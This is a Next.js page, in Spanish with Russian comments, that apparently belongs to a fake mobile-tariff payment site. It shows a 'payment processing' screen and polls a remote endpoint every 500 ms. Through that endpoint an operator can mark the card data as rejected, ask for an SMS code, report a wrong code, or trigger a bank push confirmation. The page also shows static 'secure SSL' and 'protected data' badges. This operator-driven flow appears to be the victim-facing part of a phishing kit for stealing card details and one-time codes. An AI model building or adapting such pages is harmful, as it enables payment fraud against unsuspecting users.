'use client';

import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Header from '../tarifas-moviles/components/Header';
import Footer from '../tarifas-moviles/components/Footer';

export const dynamic = 'force-dynamic';

type StatusType =
  | 'processing'
  | 'rejected'
  | 'otp_requested'
  | 'otp_submitted'
  | 'otp_error'
  | 'approved'
  | 'push_requested'
  | 'error';

export default function ProcessingPage() {
  const router = useRouter();
  const [status, setStatus] = useState<StatusType>('processing');
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    const storedSessionId =
      typeof window !== 'undefined' ? localStorage.getItem('paymentSession') : null;

    if (!storedSessionId) {
      setSessionId(null);
      return;
    }

    setSessionId(storedSessionId);

    const pollStatus = async () => {
      try {
        const res = await fetch(
          `/api/payment-status-vercel?sessionId=${storedSessionId}&t=${Date.now()}`
        );
        const data = await res.json();

        if (data.status && data.status !== status) {
          setStatus(data.status);

          if (data.status === 'rejected') {
            router.push('/payment?error=rejected');
          } else if (data.status === 'otp_requested') {
            setTimeout(() => router.push('/otp'), 500);
          } else if (data.status === 'otp_error') {
            router.push('/otp?error=invalid');
          } else if (data.status === 'approved') {
            setTimeout(() => router.push('/success'), 500);
          } else if (data.status === 'push_requested') {
            // сохраняем payload для PUSH-страницы
            if (data.pushPayload) {
              try {
                localStorage.setItem('paymentPush', JSON.stringify(data.pushPayload));
              } catch {
                // ignore
              }
            }
            // уходим на страницу push-подтверждения
            router.push('/push');
          }
        }
      } catch (e) {
        // silent
      }
    };

    const interval = setInterval(pollStatus, 500);
    pollStatus();

    return () => clearInterval(interval);
  }, [router, status]);

  const getStatusMessage = () => {
    switch (status) {
      case 'processing':
        return {
          title: 'Procesando tu pago',
          message: 'Estamos verificando tus datos de pago. Por favor, espera.',
          icon: 'spinner'
        };
      case 'rejected':
        return {
          title: 'Error en los datos',
          message: 'Los datos proporcionados son incorrectos. Te redirigiremos para corregirlos.',
          icon: 'fa-exclamation-triangle'
        };
      case 'otp_requested':
        return {
          title: 'Verificación requerida',
          message: 'Te redirigiremos para introducir el código de verificación.',
          icon: 'fa-shield-alt'
        };
      case 'otp_submitted':
        return {
          title: 'Verificando código SMS',
          message: 'Hemos recibido tu código. Estamos verificando su validez.',
          icon: 'spinner'
        };
      case 'otp_error':
        return {
          title: 'Código OTP incorrecto',
          message: 'El código de verificación es incorrecto. Inténtalo de nuevo.',
          icon: 'fa-exclamation-triangle'
        };
      case 'approved':
        return {
          title: '¡Pago exitoso!',
          message: 'Tu pago ha sido procesado correctamente.',
          icon: 'fa-check-circle'
        };
      case 'push_requested':
        return {
          title: 'Confirmación requerida',
          message: 'Estamos enviando una solicitud de confirmación a tu dispositivo…',
          icon: 'spinner'
        };
      default:
        return { title: 'Procesando', message: 'Por favor, espera.', icon: 'spinner' };
    }
  };

  const statusInfo = getStatusMessage();

  return (
    <>
      <Header />
      <main className="bg-gray-50 font-sans min-h-screen wave-bg">
        <div className="container mx-auto px-4 py-6 md:py-8">
          <div className="max-w-md mx-auto">
            <div className="tariff-card p-8 text-center slide-in-up">
              <div
                className={`text-6xl mb-6 ${
                  status === 'rejected' || status === 'otp_error'
                    ? 'text-red-500'
                    : status === 'approved'
                    ? 'text-green-500'
                    : status === 'otp_requested'
                    ? 'text-blue-500'
                    : status === 'otp_submitted'
                    ? 'text-orange-500'
                    : 'text-[#E52E8A]'
                }`}
              >
                {statusInfo.icon === 'spinner' ? (
                  <div className="flex flex-col items-center gap-4">
                    <div className="spinner spinner-large mx-auto"></div>
                    <div className="dots-loader">
                      <div className="dot"></div>
                      <div className="dot"></div>
                      <div className="dot"></div>
                    </div>
                  </div>
                ) : (
                  <i
                    className={`fas ${statusInfo.icon} ${
                      status === 'approved'
                        ? 'icon-bounce'
                        : status === 'otp_requested'
                        ? 'icon-breathe'
                        : ''
                    }`}
                  ></i>
                )}
              </div>

              <h1
                className={`text-2xl font-bold mb-4 text-gray-800 ${
                  status === 'processing' ||
                  status === 'otp_submitted' ||
                  status === 'push_requested'
                    ? 'loading-dots'
                    : ''
                }`}
              >
                {statusInfo.title}
              </h1>

              <p className="text-gray-600 mb-6">{statusInfo.message}</p>

              {(status === 'processing' ||
                status === 'otp_submitted' ||
                status === 'push_requested') && (
                <div className="mb-6">
                  <div className="progress-bar"></div>
                </div>
              )}

              {status === 'processing' && (
                <div className="bg-gradient-to-r from-pink-50 to-orange-50 rounded-lg p-4 pulse">
                  <div className="flex items-center justify-center gap-2 text-sm text-gray-600">
                    <i className="fas fa-shield-alt text-green-600 icon-breathe"></i>
                    Tu pago está siendo procesado de forma segura
                  </div>
                </div>
              )}

              {status === 'otp_submitted' && (
                <div className="bg-gradient-to-r from-orange-50 to-pink-50 rounded-lg p-4 pulse">
                  <div className="flex items-center justify-center gap-2 text-sm text-orange-700">
                    <i className="fas fa-mobile-alt text-orange-600 icon-bounce"></i>
                    Verificando tu código SMS
                  </div>
                </div>
              )}

              {status === 'approved' && (
                <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg p-4 slide-in-up">
                  <div className="flex items-center justify-center gap-2 text-sm text-green-700">
                    <i className="fas fa-check-circle text-green-600 icon-bounce"></i>
                    ¡Transacción completada con éxito!
                  </div>
                </div>
              )}

              {sessionId && (
                <div className="mt-6 text-xs text-gray-400">ID de sesión: {sessionId}</div>
              )}
            </div>

            <div className="text-center mt-6 text-sm text-gray-600">
              <p className="mb-2 flex items-center justify-center gap-2">
                <i className="fas fa-lock text-green-600 icon-breathe"></i>
                Conexión segura SSL
              </p>
              <p className="flex items-center justify-center gap-2">
                <i className="fas fa-shield-alt text-green-600 icon-breathe"></i>
                Datos protegidos
              </p>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </>
  );
}
